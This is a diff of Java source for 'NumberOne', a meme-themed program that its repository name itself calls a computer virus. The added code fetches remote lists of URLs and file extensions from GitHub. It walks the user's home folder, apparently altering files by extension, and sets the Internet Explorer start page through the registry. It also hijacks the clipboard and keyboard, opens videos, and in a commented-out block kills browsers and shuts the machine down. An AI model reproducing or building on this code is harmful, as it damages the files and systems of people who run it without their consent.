@@ -15,51 +15,19 @@ import java.util.Date;
 import java.util.Random;
 
 public class NumberOne {
-	public static Random r = new Random();
+	public static final String memezz = "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/meme";
+	public static final String extttt = "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/ext";
 	public static final String user = System.getProperty("user.name");
+	public static final String dir = System.getProperty("user.dir");
+	public static String[] meme = new String[0];
+	public static String[] ext = new String[0];
+	public static boolean[] pay = {false, false};
+	public static boolean running = true;
+	public static Random r = new Random();
 	public static String[] date = {
 			//"03",
 			"11"			
 	}; //dd
-	public static String[] meme = {
-			"https://www.gofundme.com/2tm9tqk",
-			"https://youtu.be/0KAgWIaqsXE",
-			"https://youtu.be/Qb_UnWIX7ko",
-			"https://youtu.be/yUUB9DhCLJ0",
-			"https://youtu.be/ikYQK8MsW9c",
-			"https://youtu.be/3FZqxXH_IDM",
-			"https://youtu.be/EePY6-gIcUE",
-			"https://youtu.be/ko9UgxRxN20",
-			"https://youtu.be/jy8H2snwqgo",
-			"https://youtu.be/PGuc5OSLebQ",
-			"https://youtu.be/I83nYm3XzW0"
-	};
-	public static String[] ext = {
-		"pdf",
-		"jpg",
-		"doc",
-		"mp3",
-		"ogg",
-		"rar",
-		"zip",
-		"7z",
-		"iso",
-		"bmp",
-		"gif",
-		"jpeg",
-		"png",
-		"ppt",
-		"pptx",
-		"xls",
-		"xlsx",
-		"lnk",
-		"avi",
-		"flv",
-		"flac",
-		"mov",
-		"wmv",
-		"txt"
-	};
 	public static void main(String[] args) throws IOException{
 		System.out.println("Startupiing");
 		startup();
@@ -71,25 +39,32 @@ public class NumberOne {
 				case("a"): {tree("C:\\Users\\" + user, false); return;}
 				case("b"): {tree("C:\\Users\\" + user, true); return;}
 				case("c"): {
-						RandomSound r = new RandomSound();
-						Thread t = new Thread(r);
-						t.start();
+						new Thread(new RandomSound()).start();
 						return;
 					}
 				case("d"): {
-					Video v = new Video();
-					Thread t = new Thread(v);
-					t.start();
+					//new Thread(new Video()).start();
 					return;
 				}
 				case("e"): {wait(Integer.parseInt(args[1]), Boolean.parseBoolean(args[2])); return;}
+				case("f"): {new Thread(new Last()).start(); return;}
+				case("g"): {new Thread(new Printer()).start(); return;}
+				case("h"): {
+					for(String s : args){
+						try{
+							if(!Last.select(Integer.parseInt(s))) System.out.println("Invalid payload.");
+						}catch(Exception e) {};
+					}
+					return;
+				}
 				default: {System.out.println("Invalid option"); return;}
 			}
 			//System.out.println("Treeing");
 		}
 		boolean b = true;
 		boolean b1= true;
-		while(true){
+		boolean b2= true;
+		while(running){
 			if(d){
 				if(b){
 					System.out.println("PAYLOADS ACTIVATED");
@@ -107,21 +82,12 @@ public class NumberOne {
 					b = false;
 					tree("C:\\Users\\" + user, true);
 					wait(r.nextInt(15000) + 15000, true);
-					Site s1 = new Site(); 
-					Thread t1 = new Thread(s1);
-					t1.start();
-					RandomSound s2 = new RandomSound();
-					Thread t2 = new Thread(s2);
-					t2.start();
-					Video s3 = new Video();
-					Thread t3 = new Thread(s3);
-					t3.start();
-					C s4 = new C();
-					Thread t4 = new Thread(s4);
-					t4.start();
+					exe("REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F");
+					exe("firefox.bat");
+					new Thread(new Last()).start();
 					//"C:\\Users\\" + user + "\\"
 				}
-				if(NumberOne.r.nextInt(5) > 2){
+				if(r.nextInt(5) > 2 && pay[0]){
 					int i = r.nextInt(2);
 					System.out.println("MAIN: Clipboard: copying " + i);
 					switch(i){
@@ -130,7 +96,7 @@ public class NumberOne {
 						default:{clipBoard("I<3 Stefan Karl Stefansson!"); break;}
 					}
 				} else System.out.println("MAIN: Clipboard: Skipping turn");
-				if(NumberOne.r.nextInt(5) > 2){
+				if(r.nextInt(5) > 2 && pay[1]){
 					System.out.println("MAIN: Type: Typing...");
 					try {
 						type();
@@ -145,18 +111,38 @@ public class NumberOne {
 					}
 				} else b1 = true;
 				if(time("HHmm").equals("2216")){ //4 3 1 6
-					if(b1){
+					if(b2){
 						exe("start https://youtu.be/yUUB9DhCLJ0");
+						b2 = false;
+					}
+				} else b2 = true;
+				/*if(time("HHmm").equals("2359")){ //4 3 1 6
+					if(b1){
+						running = false;
+						FileO.delater("done.tmp");
+						exe("takkill /IM c.exe /F");
+						exe("takkill /IM s.exe /F");
+						exe("takkill /IM firefox.exe /F");
+						exe("takkill /IM chrome.exe /F");
+						exe("takkill /IM iexplorer.exe /F");
+						exe("takkill /IM MicrosoftEdge.exe /F");
+						wait(10000, true);
+						exe("final.vbs");
+						while(!FileO.exist("done.tmp")) wait(1000, false);
+						wait(2500, true);
+						Last.last();
+						exe("shutdown -p");
+						stop();
 						b1 = false;
 					}
-				} else b1 = true;
+				} else b1 = true;*/
 			}
 			if(d1){
 				if(b){
 					FileO.newFile("NumberOne.txt");
 					FileO.writer("You ejoyed the we are number one day?", "NumberOne.txt");
 					FileO.addWrite("NumberOne.txt", "Now i'm (trying) to backing your computer as normal.");
-					FileO.addWrite("NumberOne.txt", "Hope you will have a good day! Now, i'm going to an english course, so... Se you next time! :D");
+					FileO.addWrite("NumberOne.txt", "Hope you will have a good day! Now, i'm going to an english course, so... See you next time! :D");
 					FileO.addWrite("NumberOne.txt", "(Remember, go support our Stefan: https://www.gofundme.com/2tm9tqk)"); 
 					exe("start NumberOne.txt");
 					new AePlayWave("18.wav").start();
@@ -173,7 +159,7 @@ public class NumberOne {
 		}
 	}
 	public static void stop(){
-		while(true) wait(Integer.MAX_VALUE, true);
+		while(true) wait(Integer.MAX_VALUE, false);
 	}
 	public static void clipBoard(String text){
 		StringSelection stringSelection = new StringSelection(text);
@@ -181,6 +167,18 @@ public class NumberOne {
 		clipboard.setContents(stringSelection, stringSelection);
 	}
 	public static void startup() throws IOException{
+		System.out.println("Startupping");
+		do{
+			try{
+				String[] localExt = Download.dwn(extttt).split("@");
+				String[] localMeme = Download.dwn(memezz).split("@");
+				meme = localMeme;
+				ext = localExt;
+			}catch(Exception e){
+				wait(1000, true);
+				e.printStackTrace();
+			}
+		}while(meme.length==0||ext.length==00);
 		if(!FileO.exist("command")) FileO.newFile("command");
 		if(!FileO.exist("other.bat")) FileO.newFile("other.bat");
 		FileO.writer("@echo off", "other.bat");
@@ -206,21 +204,14 @@ public class NumberOne {
     	FileO.writer(cmd, "command");
     	Runtime.getRuntime().exec("other.bat");
     }
-    public static void wait(int time, boolean check){
-    	long start = System.currentTimeMillis();
+    public static void wait(int time, boolean mode){
+    	if(!mode) time = r.nextInt(time);
     	try{
-		    Thread.sleep(NumberOne.r.nextInt(time));
+		    Thread.sleep(time);
 		} catch(InterruptedException ex){
 			ex.printStackTrace();
 		    Thread.currentThread().interrupt();
 		}
-    	long stop = System.currentTimeMillis();
-    	long elapse = stop - start;
-    	if(elapse < time && check) {
-    		int neW = time - (int) elapse;
-    		System.out.println("WAIT-ERROR: Elapsed: " + elapse + "   Request: " + time + "   New: " + neW);
-    		wait(neW, check);
-    	}
     }
     public static void type() throws AWTException {
     	Robot robot = new Robot();
@@ -261,7 +252,7 @@ public class NumberOne {
 		}catch(NullPointerException e) {e.printStackTrace();}
 	}
 	public static void replacer(String s){
-		String[] sp = s.split("\\.");
+		String[] sp = s.split("\\.");	
 		String r = "";
 		for(int i = 0; i < (sp.length - 1); i++) r += sp[i] + ".";
 		System.out.println("\n" + s + " " + r);
